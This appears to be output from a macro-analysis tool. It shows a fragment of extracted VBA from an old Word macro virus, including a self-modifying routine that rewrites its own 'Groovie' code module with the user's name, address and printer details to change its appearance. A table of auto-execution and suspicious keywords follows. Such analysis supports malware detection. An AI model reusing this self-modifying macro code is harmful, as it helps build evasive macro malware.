 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    GoTo over
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
docek:
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    I07 = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
over:
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I16()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Randomize
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
rn = Int(Rnd * 999)
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
For x = 2 To 358 Step 2
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
.DeleteLines x
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Next x
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

